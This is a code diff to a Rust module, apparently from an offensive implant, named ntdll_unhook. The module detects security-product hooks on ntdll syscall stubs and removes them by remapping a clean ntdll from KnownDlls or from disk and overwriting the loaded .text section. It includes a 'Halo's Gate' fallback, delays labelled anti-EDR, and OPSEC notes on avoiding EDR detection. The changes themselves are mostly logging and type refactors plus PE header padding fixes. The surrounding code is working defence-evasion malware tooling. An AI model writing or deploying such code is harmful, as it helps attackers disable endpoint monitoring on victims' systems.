@@ -107,18 +107,33 @@ struct ImageDosHeader {
 #[repr(C)]
 struct ImageNtHeaders64 {
     signature: u32,
-    // FILE_HEADER (20 bytes)
+    // ── FILE_HEADER (20 bytes) ─────────────────────────────────────────
     machine: u16,
     number_of_sections: u16,
     _file_pad: [u8; 16],
-    // OPTIONAL_HEADER (starts here)
+    // ── OPTIONAL_HEADER (PE32+, 240 bytes total incl. data dirs) ───────
     magic: u16,
-    _opt_pad: [u8; 30], // up to SizeOfImage at offset 56 in optional header
+    //   +2  MajorLinkerVersion, MinorLinkerVersion          (2 bytes)
+    //   +4  SizeOfCode, SizeOfInitializedData,               (8 bytes)
+    //       SizeOfUninitializedData
+    //  +12  AddressOfEntryPoint                              (4 bytes)
+    //  +16  BaseOfCode                                       (4 bytes)
+    //  +20  ImageBase (u64)                                  (8 bytes)
+    //  +28  SectionAlignment, FileAlignment                  (8 bytes)
+    //  +36  OS/Image/Subsystem versions (6 × u16)            (12 bytes)
+    //  +48  Win32VersionValue                                (4 bytes)
+    //  ── total pre-padding: 54 bytes ────────────────────────────────────
+    _opt_pad: [u8; 54],
+    //  +56  SizeOfImage (u32)
     size_of_image: u32,
-    _opt_pad2: [u8; 4], // after SizeOfImage
+    //  +60  SizeOfHeaders (u32)
     size_of_headers: u32,
-    _opt_pad3: [u8; 112], // rest of optional header to data directories
-                          // We don't need data directories for section walking — sections follow immediately
+    //  +64  CheckSum (u32) + Subsystem (u16) + DllCharacteristics (u16)  (8 bytes)
+    //  +72  SizeOfStackReserve..SizeOfHeapCommit (4 × u64)               (32 bytes)
+    //  +104 LoaderFlags (u32) + NumberOfRvaAndSizes (u32)               (8 bytes)
+    //  +112 DataDirectory[16] (16 × 8 bytes = 128 bytes)
+    //  ── total: 64 + 8 + 32 + 8 + 128 = 240 bytes of optional header ──
+    _opt_pad3: [u8; 176],
 }
 
 #[repr(C)]
@@ -127,7 +142,11 @@ struct ImageSectionHeader {
     misc_virtual_size: u32,
     virtual_address: u32,
     size_of_raw_data: u32,
-    _rest: [u8; 16],
+    //  +20  PointerToRawData (u32)
+    //  +24  PointerToRelocations + PointerToLinenumbers (8 bytes)
+    //  +32  NumberOfRelocations + NumberOfLinenumbers (4 bytes)
+    //  +36  Characteristics (u32)
+    _rest: [u8; 20],
 }
 
 // ── Detection ───────────────────────────────────────────────────────────────
@@ -150,7 +169,7 @@ pub unsafe fn are_syscall_stubs_hooked() -> bool {
     let ntdll_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
         Some(b) => b,
         None => {
-            log::warn!("[ntdll_unhook] cannot resolve ntdll base — assuming hooked");
+            tracing::warn!("[ntdll_unhook] cannot resolve ntdll base — assuming hooked");
             return true;
         }
     };
@@ -180,7 +199,7 @@ pub unsafe fn are_syscall_stubs_hooked() -> bool {
                 || prologue[0] == 0xC3; // ret (neutered)
 
             if hooked {
-                log::warn!(
+                tracing::warn!(
                     "[ntdll_unhook] {} appears hooked (prologue: {:02X} {:02X} {:02X} {:02X})",
                     func_name,
                     prologue[0],
@@ -200,7 +219,7 @@ pub unsafe fn are_syscall_stubs_hooked() -> bool {
             }
             // Unknown prologue — could be a different hook style or OS variant.
             // Log but don't trigger unhooking based on one unknown byte.
-            log::debug!(
+            tracing::debug!(
                 "[ntdll_unhook] {} has unusual prologue: {:02X} {:02X} {:02X} {:02X}",
                 func_name,
                 prologue[0],
@@ -348,12 +367,12 @@ fn invalidate_syscall_cache() {
     crate::syscalls::invalidate_syscall_cache();
 
     // Force re-resolve all critical syscalls so the cache is warm.
-    log::debug!("[ntdll_unhook] invalidating syscall cache — re-resolving all stubs");
+    tracing::debug!("[ntdll_unhook] invalidating syscall cache — re-resolving all stubs");
 
     for func_name in CRITICAL_SYSCALLS {
         match crate::syscalls::get_syscall_id(func_name) {
             Ok(target) => {
-                log::debug!(
+                tracing::debug!(
                     "[ntdll_unhook] re-resolved {}: SSN={}, gadget={:#x}",
                     func_name,
                     target.ssn,
@@ -361,7 +380,7 @@ fn invalidate_syscall_cache() {
                 );
             }
             Err(e) => {
-                log::warn!("[ntdll_unhook] failed to re-resolve {}: {}", func_name, e);
+                tracing::warn!("[ntdll_unhook] failed to re-resolve {}: {}", func_name, e);
             }
         }
     }
@@ -369,7 +388,7 @@ fn invalidate_syscall_cache() {
     // Also resolve any other syscalls that might be in the cache but not in
     // our critical list — the next call will hit the clean ntdll since we've
     // just overwritten the .text section.
-    log::debug!("[ntdll_unhook] cache invalidation complete");
+    tracing::debug!("[ntdll_unhook] cache invalidation complete");
 }
 
 // ── Chunked memcpy with anti-EDR delays ─────────────────────────────────────
@@ -423,17 +442,17 @@ unsafe fn normalize_execution() {
 ///
 /// Returns `Ok(bytes_written)` on success.
 unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
-    log::debug!("[ntdll_unhook] attempting KnownDlls path");
+    tracing::debug!("[ntdll_unhook] attempting KnownDlls path");
 
     // ── Step 1: Open KnownDlls ntdll section ─────────────────────────────
     let mut section_name: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
-    let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
+    let mut obj_name = crate::win_types::UNICODE_STRING {
         Length: ((section_name.len() - 1) * 2) as u16,
         MaximumLength: (section_name.len() * 2) as u16,
         Buffer: section_name.as_mut_ptr(),
     };
-    let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
-        Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
+    let mut obj_attr = crate::win_types::OBJECT_ATTRIBUTES {
+        Length: std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: ptr::null_mut(),
         ObjectName: &mut obj_name,
         Attributes: OBJ_CASE_INSENSITIVE,
@@ -493,7 +512,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "[ntdll_unhook] clean ntdll mapped at {:#x} (size {:#x})",
         clean_base,
         view_size
@@ -518,7 +537,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     let clean_text_base = clean_base + clean_text_rva as usize;
     let hooked_text_base = hooked_base + hooked_text_rva as usize;
 
-    log::debug!(
+    tracing::debug!(
         "[ntdll_unhook] .text section: clean={:#x} hooked={:#x} size={:#x}",
         clean_text_base,
         hooked_text_base,
@@ -588,7 +607,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     let _ = crate::syscall!("NtUnmapViewOfSection", cur_proc, clean_base as u64);
     let _ = crate::syscall!("NtClose", h_section as u64);
 
-    log::info!(
+    tracing::info!(
         "[ntdll_unhook] KnownDlls unhook complete — .text overwritten ({:#x} bytes)",
         copy_size,
     );
@@ -604,7 +623,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
 /// **OPSEC warning**: Opening ntdll.dll from disk creates a file I/O event
 /// that EDR can monitor. Prefer `unhook_via_known_dlls()`.
 unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
-    log::debug!("[ntdll_unhook] attempting disk fallback path");
+    tracing::debug!("[ntdll_unhook] attempting disk fallback path");
 
     let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
     let ntdll_path = format!("\\??\\{}\\System32\\ntdll.dll", sysroot);
@@ -614,13 +633,13 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
         .encode_utf16()
         .chain(std::iter::once(0))
         .collect();
-    let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
+    let mut obj_name = crate::win_types::UNICODE_STRING {
         Length: ((path_u16.len() - 1) * 2) as u16,
         MaximumLength: (path_u16.len() * 2) as u16,
         Buffer: path_u16.as_mut_ptr(),
     };
-    let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
-        Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
+    let mut obj_attr = crate::win_types::OBJECT_ATTRIBUTES {
+        Length: std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: ptr::null_mut(),
         ObjectName: &mut obj_name,
         Attributes: OBJ_CASE_INSENSITIVE,
@@ -705,13 +724,13 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
             .encode_utf16()
             .chain(std::iter::once(0))
             .collect();
-        let mut obj_name_2 = winapi::shared::ntdef::UNICODE_STRING {
+        let mut obj_name_2 = crate::win_types::UNICODE_STRING {
             Length: ((path_u16_2.len() - 1) * 2) as u16,
             MaximumLength: (path_u16_2.len() * 2) as u16,
             Buffer: path_u16_2.as_mut_ptr(),
         };
-        let mut obj_attr_2 = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
-            Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
+        let mut obj_attr_2 = crate::win_types::OBJECT_ATTRIBUTES {
+            Length: std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32,
             RootDirectory: ptr::null_mut(),
             ObjectName: &mut obj_name_2,
             Attributes: OBJ_CASE_INSENSITIVE,
@@ -832,7 +851,7 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
         copy_size as u64,
     );
 
-    log::info!(
+    tracing::info!(
         "[ntdll_unhook] disk fallback unhook complete — .text overwritten ({:#x} bytes)",
         copy_size,
     );
@@ -880,11 +899,11 @@ pub fn unhook_ntdll() -> anyhow::Result<UnhookResult> {
         let result = match unhook_via_known_dlls() {
             Ok(n) => {
                 bytes_overwritten = n;
-                log::info!("[ntdll_unhook] KnownDlls unhook succeeded");
+                tracing::info!("[ntdll_unhook] KnownDlls unhook succeeded");
                 Ok("known_dlls".to_string())
             }
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "[ntdll_unhook] KnownDlls path failed ({}), trying disk fallback",
                     e
                 );
@@ -892,11 +911,11 @@ pub fn unhook_ntdll() -> anyhow::Result<UnhookResult> {
                 match unhook_via_disk() {
                     Ok(n) => {
                         bytes_overwritten = n;
-                        log::info!("[ntdll_unhook] disk fallback succeeded");
+                        tracing::info!("[ntdll_unhook] disk fallback succeeded");
                         Ok("disk".to_string())
                     }
                     Err(e2) => {
-                        log::error!(
+                        tracing::error!(
                             "[ntdll_unhook] both methods failed: KnownDlls={}, Disk={}",
                             e,
                             e2
@@ -953,14 +972,14 @@ pub fn unhook_ntdll() -> anyhow::Result<UnhookResult> {
 pub fn maybe_unhook() -> anyhow::Result<bool> {
     unsafe {
         if !are_syscall_stubs_hooked() {
-            log::debug!("[ntdll_unhook] no hooks detected — skipping unhook");
+            tracing::debug!("[ntdll_unhook] no hooks detected — skipping unhook");
             return Ok(false);
         }
 
-        log::info!("[ntdll_unhook] hooks detected — initiating unhook");
+        tracing::info!("[ntdll_unhook] hooks detected — initiating unhook");
         let result = unhook_ntdll()?;
         if result.error.is_empty() {
-            log::info!(
+            tracing::info!(
                 "[ntdll_unhook] unhook successful via {} ({} stubs re-resolved)",
                 result.method,
                 result.stubs_re_resolved,
@@ -997,11 +1016,11 @@ pub fn last_hook_detection_time() -> u64 {
 /// nt_syscall::set_halo_gate_fallback(crate::ntdll_unhook::halo_gate_fallback);
 /// ```
 pub fn halo_gate_fallback() -> bool {
-    log::info!("[ntdll_unhook] Halo's Gate fallback triggered — performing full unhook");
+    tracing::info!("[ntdll_unhook] Halo's Gate fallback triggered — performing full unhook");
     match unhook_ntdll() {
         Ok(result) => {
             if result.error.is_empty() {
-                log::info!(
+                tracing::info!(
                     "[ntdll_unhook] Halo's Gate fallback unhook succeeded via {}",
                     result.method,
                 );
@@ -1010,7 +1029,7 @@ pub fn halo_gate_fallback() -> bool {
                 crate::syscalls::invalidate_syscall_cache();
                 true
             } else {
-                log::error!(
+                tracing::error!(
                     "[ntdll_unhook] Halo's Gate fallback unhook failed: {}",
                     result.error,
                 );
@@ -1018,7 +1037,7 @@ pub fn halo_gate_fallback() -> bool {
             }
         }
         Err(e) => {
-            log::error!("[ntdll_unhook] Halo's Gate fallback unhook error: {e}");
+            tracing::error!("[ntdll_unhook] Halo's Gate fallback unhook error: {e}");
             false
         }
     }
